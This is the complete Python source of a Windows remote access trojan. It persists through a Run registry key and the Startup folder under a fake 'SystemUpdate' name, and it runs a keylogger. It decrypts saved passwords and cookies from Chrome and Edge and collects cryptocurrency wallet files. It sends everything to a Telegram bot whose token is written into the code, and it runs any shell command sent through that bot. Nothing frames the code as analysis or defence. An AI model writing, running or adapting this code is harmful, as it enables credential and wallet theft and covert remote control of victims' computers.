import os
import requests
import winreg
import logging
from datetime import datetime
import sys
import threading
import socket
import getpass
import subprocess
from pynput import keyboard
import time
import shutil
import sqlite3
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import json

TELEGRAM_BOT_TOKEN = "8097111754:AAEf2UNq9afZxCdNqGvoVuzuTRC0AB8Jess"  
TELEGRAM_CHAT_ID = "-1002965147816"     

OUTPUT_DIR = os.path.join(os.getenv("TEMP"), "rat_data")
LOG_FILE = os.path.join(os.getenv("TEMP"), "rat.log")
KEYLOG_FILE = os.path.join(os.getenv("TEMP"), "keylog.txt")

BROWSER_PATHS = {
    "Chrome": r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default",
    "Edge": r"C:\Users\{}\AppData\Local\Microsoft\Edge\User Data\Default"
}

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

key_buffer = []
last_offset = [0]
stop_event = threading.Event()

def ensure_directory():
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)
    logging.info(f"Output directory created: {OUTPUT_DIR}")

def set_working_directory():
    temp_dir = os.getenv("TEMP")
    if temp_dir and os.path.exists(temp_dir):
        os.chdir(temp_dir)
        logging.info(f"Set working directory to {temp_dir}")

def add_persistence():
    try:
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        logging.info("Persistence added via HKCU registry")
        
        startup_dir = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
        startup_path = os.path.join(startup_dir, "systemupdate.exe")
        if not os.path.exists(startup_path) or os.path.getmtime(exe_path) > os.path.getmtime(startup_path):
            shutil.copy2(exe_path, startup_path)
            logging.info(f"Copied to startup: {startup_path}")
        
        if not exe_path.lower().startswith(startup_dir.lower()) and getattr(sys, 'frozen', False):
            subprocess.Popen(startup_path, shell=True, creationflags=subprocess.DETACHED_PROCESS)
            sys.exit(0)
    except Exception as e:
        logging.error(f"Failed to add persistence: {e}")

def get_system_info():
    hostname = socket.gethostname()
    username = getpass.getuser()
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "127.0.0.1"
    try:
        users = subprocess.run("net user", shell=True, capture_output=True, text=True).stdout
    except Exception:
        users = "Failed to get users"
    return f"Hostname: {hostname}\nIP: {ip}\nUser: {username}\nUsers:\n{users}"

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
        output = result.stdout if result.stdout else result.stderr
        logging.info(f"Executed command '{command}': {output}")
        return output.strip() or "No output"
    except Exception as e:
        logging.error(f"Command execution failed: {e}")
        return f"Error: {e}"

def send_to_telegram(message, file_path=None):
    max_retries = 3
    telegram_url = f"https://api.telegram.org/bot8097111754:AAEf2UNq9afZxCdNqGvoVuzuTRC0AB8Jess/sendMessage"
    file_url = f"https://api.telegram.org/bot8097111754:AAEf2UNq9afZxCdNqGvoVuzuTRC0AB8Jess/sendDocument"
    
    if file_path:
        for attempt in range(max_retries):
            try:
                with open(file_path, "rb") as f:
                    files = {"document": (os.path.basename(file_path), f)}
                    data = {"chat_id": TELEGRAM_CHAT_ID}
                    response = requests.post(file_url, files=files, data=data, timeout=10)
                    if response.status_code == 200:
                        logging.info(f"Sent file {file_path} to Telegram")
                        return True
                logging.warning(f"Failed to send file: HTTP {response.status_code}")
            except Exception as e:
                logging.error(f"Attempt {attempt + 1}/{max_retries} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(5)
    else:
        for attempt in range(max_retries):
            try:
                for i in range(0, len(message), 4096):
                    chunk = message[i:i+4096]
                    data = {"chat_id": TELEGRAM_CHAT_ID, "text": chunk}
                    response = requests.post(telegram_url, data=data, timeout=10)
                    if response.status_code != 200:
                        logging.warning(f"Failed to send message chunk: HTTP {response.status_code}")
                        return False
                logging.info(f"Sent message to Telegram: {message[:100]}...")
                return True
            except Exception as e:
                logging.error(f"Attempt {attempt + 1}/{max_retries} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(5)
    logging.error("All retries exhausted")
    return False

def get_encryption_key(browser, username):
    local_state_path = os.path.join(
        r"C:\Users", username, "AppData", "Local",
        "Google" if browser == "Chrome" else "Microsoft",
        "Chrome" if browser == "Chrome" else "Edge",
        "User Data", "Local State"
    )
    if not os.path.exists(local_state_path):
        logging.warning(f"No Local State found for {browser}")
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            logging.warning("No encrypted_key in Local State")
            return None
        encrypted_key = base64.b64decode(encrypted_key)
        key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return key
    except Exception as e:
        logging.error(f"Failed to get encryption key for {browser}: {e}")
        return None

def decrypt_aes_gcm(key, encrypted_data):
    try:
        if encrypted_data.startswith(b"v10"):
            nonce = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            tag = encrypted_data[-16:]
            aesgcm = AESGCM(key)
            decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
            return decrypted.decode("utf-8", errors="replace")
        else:
            logging.warning("Encrypted data does not start with 'v10'")
            return "Invalid format"
    except Exception as e:
        logging.error(f"AES decryption failed: {e}")
        return f"AES decryption failed: {str(e)}"

def decrypt_password(encrypted_password, aes_key=None):
    if isinstance(encrypted_password, bytes):
        if encrypted_password.startswith(b"v10") and aes_key:
            return decrypt_aes_gcm(aes_key, encrypted_password)
        else:
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted.decode("utf-8", errors="replace")
            except Exception as e:
                logging.error(f"DPAPI decryption failed: {e}")
                return f"DPAPI decryption failed: {str(e)}"
    else:
        logging.warning("Encrypted password is not bytes")
        return "Invalid data type"

def steal_passwords(browser, path, aes_key=None):
    db_path = os.path.join(path, "Login Data")
    if not os.path.exists(db_path):
        logging.warning(f"No Login Data found for {browser} at {db_path}")
        return []
    temp_db = os.path.join(OUTPUT_DIR, f"temp_{browser}_login.db")
    shutil.copy2(db_path, temp_db)
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, aes_key)
            passwords.append(f"{url} | {username} | {password}")
        conn.close()
        logging.info(f"Extracted {len(passwords)} passwords from {browser}")
        return passwords
    except Exception as e:
        logging.error(f"Error extracting passwords from {browser}: {e}")
        return []
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

def steal_cookies(browser, path, aes_key=None):
    db_path = os.path.join(path, "Cookies")
    if not os.path.exists(db_path):
        logging.warning(f"No Cookies found for {browser} at {db_path}")
        return []
    temp_db = os.path.join(OUTPUT_DIR, f"temp_{browser}_cookies.db")
    shutil.copy2(db_path, temp_db)
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for row in cursor.fetchall():
            host, name, encrypted_value = row
            decrypted_value = decrypt_password(encrypted_value, aes_key)
            cookies.append(f"{host} | {name} | {decrypted_value}")
        conn.close()
        logging.info(f"Extracted {len(cookies)} cookies from {browser}")
        return cookies
    except Exception as e:
        logging.error(f"Error extracting cookies from {browser}: {e}")
        return []
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

def steal_browser_data():
    username = getpass.getuser()
    output = ""
    
    for browser, path_template in BROWSER_PATHS.items():
        try:
            path = path_template.format(username)
            if not os.path.exists(path):
                logging.warning(f"{browser} not found at {path}")
                continue
            
            aes_key = get_encryption_key(browser, username)
            passwords = steal_passwords(browser, path, aes_key)
            cookies = steal_cookies(browser, path, aes_key)
            
            output += f"{browser} Passwords:\n" + "\n".join(passwords) + "\n\n"
            output += f"{browser} Cookies:\n" + "\n".join(cookies[:50]) + "\n\n" 
        except Exception as e:
            logging.error(f"Error processing {browser}: {e}")
            output += f"Error processing {browser}: {e}\n"
    
    return output if output else "No browser data found"

def find_crypto_wallet():
    user_dir = os.path.expanduser("~")
    wallet_paths = [
        os.path.join(os.getenv("APPDATA"), "Exodus", "exodus.wallet"),
        os.path.join(os.getenv("APPDATA"), "Electrum", "wallets"),
        os.path.join(os.getenv("APPDATA"), "monero-project", "wallets"),
        os.path.join(user_dir, "Documents", "Monero", "wallets"),
        os.path.join(os.getenv("APPDATA"), "Ledger Live"),
        os.path.join(user_dir, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
        os.path.join(user_dir, "AppData", "Roaming", "Ethereum", "keystore"),
    ]
    
    found_wallets = []
    for base_path in wallet_paths:
        if os.path.exists(base_path):
            if os.path.isdir(base_path):
                for root, _, files in os.walk(base_path):
                    for file in files:
                        if file.endswith((".dat", ".wallet", ".keys")) or "keystore" in file.lower():
                            wallet_path = os.path.join(root, file)
                            found_wallets.append(wallet_path)
                            logging.info(f"Found wallet file: {wallet_path}")
            else:
                found_wallets.append(base_path)
                logging.info(f"Found wallet file: {base_path}")
    
    return found_wallets if found_wallets else None

def reverse_shell():
    while not stop_event.is_set():
        try:
            url = f"https://api.telegram.org/bot8097111754:AAEf2UNq9afZxCdNqGvoVuzuTRC0AB8Jess/getUpdates"
            response = requests.get(url, params={"offset": last_offset[0] + 1, "timeout": 10}, timeout=15)
            if response.status_code == 200:
                data = response.json()
                if data.get("ok") and data.get("result"):
                    for update in data["result"]:
                        last_offset[0] = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            chat_id = update["message"]["chat"]["id"]
                            if str(chat_id) == TELEGRAM_CHAT_ID:
                                command = update["message"]["text"].strip()
                                logging.info(f"Received command: {command}")
                                if command == "/info":
                                    send_to_telegram(get_system_info())
                                elif command == "/keylog":
                                    if os.path.exists(KEYLOG_FILE):
                                        send_to_telegram("Keylog file:", KEYLOG_FILE)
                                    else:
                                        send_to_telegram("No keylog yet")
                                elif command.startswith("/get "):
                                    file_path = command[5:].strip()
                                    if os.path.exists(file_path):
                                        send_to_telegram(f"Sending file {file_path}:", file_path)
                                    else:
                                        send_to_telegram(f"File not found: {file_path}")
                                elif command == "/wallet":
                                    wallets = find_crypto_wallet()
                                    if wallets:
                                        for wallet in wallets:
                                            send_to_telegram(f"Found wallet: {wallet}", wallet)
                                    else:
                                        send_to_telegram("No crypto wallets found")
                                elif command == "/browser":
                                    browser_data = steal_browser_data()
                                    temp_file = os.path.join(OUTPUT_DIR, f"browser_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
                                    with open(temp_file, "w", encoding="utf-8") as f:
                                        f.write(browser_data)
                                    send_to_telegram("Browser data:", temp_file)
                                    os.remove(temp_file)
                                elif command == "/exit":
                                    send_to_telegram("RAT shutting down")
                                    stop_event.set()
                                else:
                                    output = execute_command(command)
                                    send_to_telegram(f"Output:\n{output}")
        except Exception as e:
            logging.error(f"Reverse shell error: {e}")
            send_to_telegram(f"Shell error: {e}")
        time.sleep(5)

def on_press(key):
    global key_buffer
    try:
        char = key.char if hasattr(key, 'char') and key.char is not None else ""
        if char:
            key_buffer.append(char)
        elif key == keyboard.Key.space:
            key_buffer.append(" ")
        elif key == keyboard.Key.enter:
            key_buffer.append("\n")
        
        if len(key_buffer) > 1000:
            key_buffer = key_buffer[-1000:]
        
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(char if char else str(key))
        logging.info(f"Logged key: {char if char else str(key)}")
        
    except Exception as e:
        logging.error(f"Keylogging error: {e}")

def main():
    logging.info("Starting RAT...")
    set_working_directory()
    ensure_directory()
    add_persistence()
    
    send_to_telegram(f"RAT online:\n{get_system_info()}")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    logging.info("Keylogger started")

    shell_thread = threading.Thread(target=reverse_shell, daemon=True)
    shell_thread.start()
    logging.info("Reverse shell started")

    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Stopping RAT via Ctrl+C...")
        stop_event.set()
        shell_thread.join(timeout=5)
        listener.stop()
        if os.path.exists(KEYLOG_FILE):
            send_to_telegram("Final keylog:", KEYLOG_FILE)

if __name__ == "__main__":
    main()
